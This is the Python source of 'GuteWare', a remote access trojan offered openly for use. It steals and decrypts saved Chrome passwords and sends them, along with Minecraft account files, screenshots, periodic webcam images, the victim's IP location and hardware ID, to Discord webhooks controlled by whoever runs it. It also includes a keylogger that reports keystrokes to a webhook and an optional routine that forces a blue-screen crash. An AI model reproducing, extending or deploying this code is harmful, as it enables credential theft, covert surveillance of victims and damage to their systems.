#  ██████╗ ██╗   ██╗████████╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗    ██████╗     ██████╗ 
# ██╔════╝ ██║   ██║╚══██╔══╝██╔════╝██║    ██║██╔══██╗██╔══██╗██╔════╝    ╚════██╗   ██╔═████╗
# ██║  ███╗██║   ██║   ██║   █████╗  ██║ █╗ ██║███████║██████╔╝█████╗       █████╔╝   ██║██╔██║
# ██║   ██║██║   ██║   ██║   ██╔══╝  ██║███╗██║██╔══██║██╔══██╗██╔══╝      ██╔═══╝    ████╔╝██║
# ╚██████╔╝╚██████╔╝   ██║   ███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗    ███████╗██╗╚██████╔╝
#  ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝ ╚═════╝ 

import os
import time
clear = lambda: os.system('cls')

print("Installing python libraries, please wait...")
clear()
os.system("pip install requests")
clear()
os.system("pip install psutil")
clear()
os.system("pip install coloredlogs")
clear()
os.system("pip install dhooks")
clear()
os.system("pip install pyautogui")
clear()
os.system("pip install keyboard")
clear()
os.system("pip install pyHook")
clear()
os.system("pip install httplib2")
clear()
os.system("pip install opencv-python")
clear()
os.system("pip install discord_webhook")
clear()
os.system("pip install httpx")
clear()

print("Library installation finished, continuing.")

red = 0xFF0000
blue = 0x0000FF
green = 0x00FF00
purple = 0xFF00FF
yellow = 0xFFFF00
white = 0xFFFFFF
black = 0x000000
grey = 0x808080
orange = 0xFFA500
pink = 0xFFC0CB
teal = 0x367588
brown = 0x964B00
maroon = 0x2D0000

import threading, subprocess, requests, re, ctypes, json, sqlite3, shutil, base64, win32gui, win32gui, time, httplib2, sys, psutil
import pyautogui, win32crypt
from dhooks import Webhook, File, Embed
from threading import Timer
from urllib.request import Request, urlopen
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
from ctypes import *
from threading import Timer 
from multiprocessing import Process
from subprocess import PIPE
from pathlib import Path  
import pygame
import pygame.camera
clear()
from os import system
import urllib.request as urllib2
import platform
import ntpath
import asyncio
from base64 import b64decode
from json import loads
from win32crypt import CryptUnprotectData
from subprocess import Popen
from re import findall
import keyboard
from discord_webhook import DiscordWebhook, DiscordEmbed
import httpx

os.system('color')
OperatingSystem = platform.system()
OSRelease = platform.release()
OSVersion = platform.version()

# you can ignore this, I just put it here because I forget to update the version before uploading it lmao

data = requests.get(
    'https://gist.github.com/SmileCrystalChecker/3cb8f30bb562487a5543858b62c3eb5e/raw')
for line in data:
    Version = line.decode()
Creator = "Gute Nacht"
link = "https://github.com/dacianfan/GuteWare-python-rat"

# //////////////////////////////////////////////////////////////

# (set your gist here)

# how to set your gist properly:
# take the link of your gist, DO NOT CLICK THE RAW BUTTON, THAT WILL NOT WORK.
# after you have your link, paste it (it should look something like this: https://gist.github.com/test/713670965c4c68010ec4b5c034c2d72d)
# then, add /raw to the end to make it look like this: https://gist.github.com/test/713670965c4c68010ec4b5c034c2d72d/raw



# ██╗   ██╗███████╗███████╗██████╗     ██╗███╗   ██╗██████╗ ██╗   ██╗████████╗   
# ██║   ██║██╔════╝██╔════╝██╔══██╗    ██║████╗  ██║██╔══██╗██║   ██║╚══██╔══╝██╗
# ██║   ██║███████╗█████╗  ██████╔╝    ██║██╔██╗ ██║██████╔╝██║   ██║   ██║   ╚═╝
# ██║   ██║╚════██║██╔══╝  ██╔══██╗    ██║██║╚██╗██║██╔═══╝ ██║   ██║   ██║   ██╗
# ╚██████╔╝███████║███████╗██║  ██║    ██║██║ ╚████║██║     ╚██████╔╝   ██║   ╚═╝
#  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝    ╚═╝       
# ████████╗██╗  ██╗██╗███████╗    ██╗███████╗    ████████╗██╗  ██╗███████╗     ██████╗ ███╗   ██╗██╗  ██╗   ██╗
# ╚══██╔══╝██║  ██║██║██╔════╝    ██║██╔════╝    ╚══██╔══╝██║  ██║██╔════╝    ██╔═══██╗████╗  ██║██║  ╚██╗ ██╔╝
#    ██║   ███████║██║███████╗    ██║███████╗       ██║   ███████║█████╗      ██║   ██║██╔██╗ ██║██║   ╚████╔╝ 
#    ██║   ██╔══██║██║╚════██║    ██║╚════██║       ██║   ██╔══██║██╔══╝      ██║   ██║██║╚██╗██║██║    ╚██╔╝  
#    ██║   ██║  ██║██║███████║    ██║███████║       ██║   ██║  ██║███████╗    ╚██████╔╝██║ ╚████║███████╗██║   
#    ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝   
# ████████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ██╗   ██╗ ██████╗ ██╗   ██╗    ███████╗██╗  ██╗ ██████╗ ██╗   ██╗██╗     ██████╗ 
# ╚══██╔══╝██║  ██║██║████╗  ██║██╔════╝     ╚██╗ ██╔╝██╔═══██╗██║   ██║    ██╔════╝██║  ██║██╔═══██╗██║   ██║██║     ██╔══██╗
#    ██║   ███████║██║██╔██╗ ██║██║  ███╗     ╚████╔╝ ██║   ██║██║   ██║    ███████╗███████║██║   ██║██║   ██║██║     ██║  ██║
#    ██║   ██╔══██║██║██║╚██╗██║██║   ██║      ╚██╔╝  ██║   ██║██║   ██║    ╚════██║██╔══██║██║   ██║██║   ██║██║     ██║  ██║
#    ██║   ██║  ██║██║██║ ╚████║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝    ███████║██║  ██║╚██████╔╝╚██████╔╝███████╗██████╔╝
#    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ 
# ██████╗ ███████╗    ███████╗██████╗ ██╗████████╗██╗███╗   ██╗ ██████╗    
# ██╔══██╗██╔════╝    ██╔════╝██╔══██╗██║╚══██╔══╝██║████╗  ██║██╔════╝    
# ██████╔╝█████╗      █████╗  ██║  ██║██║   ██║   ██║██╔██╗ ██║██║  ███╗   
# ██╔══██╗██╔══╝      ██╔══╝  ██║  ██║██║   ██║   ██║██║╚██╗██║██║   ██║   
# ██████╔╝███████╗    ███████╗██████╔╝██║   ██║   ██║██║ ╚████║╚██████╔╝██╗
# ╚═════╝ ╚══════╝    ╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝

# editing anything else may break something.

data = requests.get(
    'your gist here')
for line in data:
    linedecoded = line.decode()
    webhook = Webhook(linedecoded)

# SET A NEW WEBHOOK FOR YOUR KEY LOGGER
# (I'd make it in a new channel because it kinda floods the channel)
keyloghook = "a different webhook here"
ReportDelay = 60 # time between reports (seconds)

# Set your webhook for webcam recording
# (I'd make it in a new channel because it kinda floods the channel)
    
camhook = Webhook("another webhook here")

# Select an embed colour
# Options: red, blue, green, purple, yellow, white, black, grey, orange, pink, teal, brown, maroon

EmbedColour = red
femboymode = True # True or False, True for femboy False for regular and stupid

# ██╗██████╗      ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
# ██║██╔══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
# ██║██████╔╝    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
# ██║██╔═══╝     ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
# ██║██║         ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
# ╚═╝╚═╝          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                        
# ///////////////////////////////////////////////////////////////////////

req = httpx.get("https://ipinfo.io/json")
if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            loc = data.get('loc')
            hostname = data.get('hostname')
            postal = data.get('postal')
            org = data.get('org')
            googlemaps = "<https://www.google.com/maps/search/google+map++" + loc + ">"
            
if country == "US":
    RegionOrState = "State"
else:
    RegionOrState = "Region"

# ██████╗  ██████╗    ██╗███╗   ██╗███████╗ ██████╗     ███████╗███████╗███╗   ██╗██████╗ ██╗███╗   ██╗ ██████╗ 
# ██╔══██╗██╔════╝    ██║████╗  ██║██╔════╝██╔═══██╗    ██╔════╝██╔════╝████╗  ██║██╔══██╗██║████╗  ██║██╔════╝ 
# ██████╔╝██║         ██║██╔██╗ ██║█████╗  ██║   ██║    ███████╗█████╗  ██╔██╗ ██║██║  ██║██║██╔██╗ ██║██║  ███╗
# ██╔═══╝ ██║         ██║██║╚██╗██║██╔══╝  ██║   ██║    ╚════██║██╔══╝  ██║╚██╗██║██║  ██║██║██║╚██╗██║██║   ██║
# ██║     ╚██████╗    ██║██║ ╚████║██║     ╚██████╔╝    ███████║███████╗██║ ╚████║██████╔╝██║██║ ╚████║╚██████╔╝
# ╚═╝      ╚═════╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝     ╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                                              
# /////////////////////////////////////////////////////////////////////////////////////////////////////////////


loginname = os.getlogin()
hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()

if femboymode == True:
    icon = "https://cdn.discordapp.com/attachments/920469526158639137/1003856313031348335/cherry-blossom_1f338.png" 
    author = "Guwute Nacht"
    webhook.username = f"GuwuteWare {Version} | Author: {author}"
    webhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003912869609472111/femboylogho.png"
    EmbedColour = pink
else:
    icon = "https://cdn.discordapp.com/attachments/920469526158639137/995553408499077210/unknown.png"
    author = "Gute Nacht"
    webhook.username(f"GuwuteWare {Version} | Author: {author}")

PC_INFO_EMBED = Embed(
    title=f"New request from {loginname}",
    color=EmbedColour,
    timestamp ='now'
)

PC_INFO_EMBED.set_author(name=author, icon_url=icon)
PC_INFO_EMBED.add_field(name="\u2063", value = f"**IP Address**: `{ip}` \n**ISP**: `{org}` \n**Hostname**: `{hostname}` \n**City**: `{city}, {postal}` \n**Country**: `{country}` \n**{RegionOrState}**: `{region}` \n **Google Maps**: https://www.google.com/maps/search/google+map++26.6644,-80.1741 \n \n**HWID**: `{hwid}` \n**OS**: `{OperatingSystem} {OSRelease} ({OSVersion})`")
PC_INFO_EMBED.set_footer(text=f"{link}")

PC_INFO_EMBED_Femboy = Embed(
    title=f"New reqwest fwom {loginname}",
    color=EmbedColour,
    timestamp ='now'
)

PC_INFO_EMBED_Femboy.set_author(name=author, icon_url=icon)
PC_INFO_EMBED_Femboy.add_field(name="\u2063", value = f"🌸**IP Addwess**: `{ip}` \n🌼**ISP**: `{org}` \n❀**Howostname**: `{hostname}` \n✿**City**: `{city}, {postal}` \n🌷**Country**: `{country}` \n🌼**{RegionOrState}**: `{region}` \n🌸**Guwugle Maps**: https://www.google.com/maps/search/google+map++26.6644,-80.1741 \n \n❀**HWID**: `{hwid}` \n🌷**OwoS**: `{OperatingSystem} {OSRelease} ({OSVersion})`")
PC_INFO_EMBED_Femboy.set_footer(text=f"{link}")

CAM_ERROR_EMBED = Embed(
    title=f"Failed to take screenshot of {loginname}'s camera :(",
    color=EmbedColour,
    timestamp ='now'
)
if femboymode == True:
    webhook.send(embed=PC_INFO_EMBED_Femboy)
else:
    webhook.send(embed=PC_INFO_EMBED)

CAM_ERROR_EMBED.set_author(name=author, icon_url=icon)
CAM_ERROR_EMBED.add_field(name="\u2063", value = f"**Reason**: User has no webcam :(")
CAM_ERROR_EMBED.set_footer(text=f"{link}")

CAM_ERROR_EMBED_Femboy = Embed(
    title=f"🌸Faiwed to take scweenshot of {loginname}'s camwa 🥺",
    color=EmbedColour,
    timestamp ='now'
)

CAM_ERROR_EMBED_Femboy.set_author(name=author, icon_url=icon)
CAM_ERROR_EMBED_Femboy.add_field(name="\u2063", value = f"🌼**Reason**: User has nowo webcam :(")
CAM_ERROR_EMBED_Femboy.set_footer(text=f"{link}")

Credit = Embed(
    title=f"Credits:",
    color=EmbedColour,
)

Credit.set_author(name=author, icon_url=icon)
Credit.add_field(name="\u2063", value = f"You are using GuteWare {Version}! \nGet it at https://github.com/dacianfan/GuteWare-python-rat \n\n<3 - Gute Nacht")
Credit.set_footer(text=f"{link}")

Credit_Femboy = Embed(
    title=f"Cwedits:",
    color=EmbedColour,
)

Credit_Femboy.set_author(name=author, icon_url=icon)
Credit_Femboy.add_field(name="\u2063", value = f"🌸 You are using GuwuteWare {Version}! \nGet it at https://github.com/dacianfan/GuteWare-python-rat \n\n<3 - Gute Nacht")
Credit_Femboy.set_footer(text=f"{link}")


#  ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗    ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ ███████╗
# ██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔════╝
# ██║     ███████║██████╔╝██║   ██║██╔████╔██║█████╗      ██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║███████╗
# ██║     ██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝      ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║╚════██║
# ╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗    ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝███████║
#  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝                                                                              
# //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

def chrome_date_and_time(chrome_data):

    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():

    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = (r"C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\HWIDAuth.db")
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            
            with open(r"C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\chromepass.txt", "a", encoding='utf-8', errors = 'ignore') as o:
                o.write(f'==================================================================================================================================================== \n')   
                o.write(f'URL: {main_url} \n')
                o.write(f'User name: {user_name} \n')
                o.write(f'Password: {decrypted_password} \n')    
          
        else:
            continue

    with open("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\chromepass.txt", "a") as o:
                if date_of_creation != 86400000000 and date_of_creation:
                    o.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))} \n")
                if last_usuage != 86400000000 and last_usuage:    
                    o.write(f"Last Used: {str(chrome_date_and_time(last_usuage))} \n")

                passwords = File(r"C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\chromepass.txt", name='passwords.txt')
                webhook.send("", file=passwords)
                o.close()
                time.sleep(1)
                os.remove("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\chromepass.txt")
  
if __name__ == "__main__":
    main()
    
# ███████╗██╗██╗     ███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
# ██╔════╝██║██║     ██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
# █████╗  ██║██║     █████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝██║██╔██╗ ██║██║  ███╗
# ██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██║██║╚██╗██║██║   ██║
# ██║     ██║███████╗███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝██║██║ ╚████║╚██████╔╝
# ╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 

# ////////////////////////////////////////////////////////////////////////////////////////////

# latest.log
#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

path_to_log = ("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\logs\\latest.log")
path_log = Path(path_to_log)

if path_log.is_file():
    latest_log = File("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\logs\\latest.log", name = "latest.log")
    webhook.send("", file = latest_log)
else:
    pass

# launcher_accounts.json
#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

path_to_LAccs = ("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_accounts.json")
path_accs = Path(path_to_LAccs)

if path_accs.is_file():
    launcheraccounts = File("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_accounts.json", name = "launcheraccounts.json")
    webhook.send("", file = launcheraccounts)
else:
    pass
 
# launcher_log.txt
#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

path_to_LLog = ("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_log.txt")
path_llog = Path(path_to_LLog)

if path_llog.is_file():
    launcherlog = File("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_log.txt", name = "launcher_log.txt")
    webhook.send("", file = launcherlog)
else:
    pass

# launcher_profiles.json
#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

path_to_LProfiles = ("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_profiles.json")
path_LProfs = Path(path_to_LProfiles)

if path_LProfs.is_file():
    launcherprofiles = File("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_profiles.json", name = "launcher_profiles.json")
    webhook.send("", file = launcherprofiles)
else:
    pass


# ██████╗  ██████╗    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗███████╗██╗  ██╗ ██████╗ ████████╗
# ██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
# ██████╔╝██║         ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║███████╗███████║██║   ██║   ██║   
# ██╔═══╝ ██║         ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══██║██║   ██║   ██║   
# ██║     ╚██████╗    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║███████║██║  ██║╚██████╔╝   ██║   
# ╚═╝      ╚═════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   

# /////////////////////////////////////////////////////////////////////////////////////////////////////

myScreenshot = pyautogui.screenshot()
myScreenshot.save("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png")


screenshot = File("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png", name = "Screenshot.png")
webhook.send("", file = screenshot)
os.remove("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png")

# ██╗    ██╗███████╗██████╗  ██████╗ █████╗ ███╗   ███╗    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗███████╗██╗  ██╗ ██████╗ ████████╗
# ██║    ██║██╔════╝██╔══██╗██╔════╝██╔══██╗████╗ ████║    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
# ██║ █╗ ██║█████╗  ██████╔╝██║     ███████║██╔████╔██║    ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║███████╗███████║██║   ██║   ██║   
# ██║███╗██║██╔══╝  ██╔══██╗██║     ██╔══██║██║╚██╔╝██║    ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══██║██║   ██║   ██║   
# ╚███╔███╔╝███████╗██████╔╝╚██████╗██║  ██║██║ ╚═╝ ██║    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║███████║██║  ██║╚██████╔╝   ██║   
#  ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   

# //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

camhook.username = "Camera Recorder"
camhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003849094374117396/download_4.png"

def FirstCameraSS():
    pygame.camera.init()
  
    camlist = pygame.camera.list_cameras()
  
    if camlist:
        cam = pygame.camera.Camera(camlist[0], (640, 480))
  
        cam.start()
        time.sleep(1)
  
        image = cam.get_image()

        timedata = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        
        pygame.image.save(image, "C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
        webcamss = File("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg", name = "WebcamScreenshot.jpg")
        webhook.send(file=webcamss)
        time.sleep(1)
        os.remove("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
    else:
        if femboymode == True:
            webhook.send(embed=CAM_ERROR_EMBED_Femboy)
        else:
            webhook.send(embed=CAM_ERROR_EMBED)

FirstCameraSS()

if femboymode == True:
    webhook.send(embed=Credit_Femboy)
else:
    webhook.send(embed=Credit)

def camss():
    working = bool()
    pygame.camera.init()
  
    camlist = pygame.camera.list_cameras()
  
    if camlist:
        
        working = True
    
    if working == True:
        cam = pygame.camera.Camera(camlist[0], (640, 480))
  
        cam.start()
        time.sleep(1)
  
        image = cam.get_image()

        timedata = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        
        pygame.image.save(image, "C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
        webcamss = File("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg", name = "WebcamScreenshot.jpg")
        camhook.send(f"New Screenshot from {loginname} at {timedata}", file=webcamss)
        time.sleep(1)
        os.remove("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
    else:
        working = False

camss()


# ███████╗ ██████╗ █████╗ ██████╗ ███████╗███████╗
# ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
# ███████╗██║     ███████║██████╔╝█████╗  ███████╗
# ╚════██║██║     ██╔══██║██╔══██╗██╔══╝  ╚════██║
# ███████║╚██████╗██║  ██║██║  ██║███████╗███████║
# ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
# ///////////////////////////////////////////////

def dl_jpg(url, file_path, file_name):
    full_path = file_path + name + '.png'
    urllib2.urlretrieve(url, full_path)
    
url = "image url"
name = "image name"
cwd = os.getcwd()

def bsod():
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("Successful")
    else:
        print("Failed")

# How to enable: 
# Remove all the comments or # from #scares() below this
# IF YOU ENABLE SCARES, ANYTHING BELOW WILL NOT WORK.

def scares():
    dl_jpg(url, "image_", name)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, cwd + "\image_" + name + ".png", 0)
    time.sleep(2)
    bsod()

#scares()

# Keylogger by https://github.com/3ct0s/discord-keylogger

class Keylogger: 
    def __init__(self, interval, report_method="webhook"):
        now = datetime.now()
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "[TAB]":
                name = ""
            elif name == "[SHIFT]":
                name = ""
            elif name == "[ESC]":
                name = "\n"
            elif name == "[ALT]":
                name = ""
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_webhook(self):
        camss()
        flag = False
        webhook = DiscordWebhook(url=keyloghook)
        if len(self.log) > 2000:
            flag = True
            path = os.environ["temp"] + "\\report.txt"
            with open(path, 'w+') as file:
                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            if femboymode == True:
                webhook.username = "Keywog Repowoter"
                webhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003849100078350416/download_3.png"
                embed = DiscordEmbed(title=f"Keywogger Repowot From {self.username} | Time: {self.end_dt}", description=self.log)
            else:
                webhook.username = "Keylog Reporter"
                webhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003849100078350416/download_3.png"
                embed = DiscordEmbed(title=f"Keylogger Report From {self.username} | Time: {self.end_dt}", description=self.log)
            webhook.add_embed(embed)    
        webhook.execute()
        if flag:
            os.remove(path)

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()    
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
    
if __name__ == "__main__":
    keylogger = Keylogger(interval=ReportDelay, report_method="webhook")    
    keylogger.start()
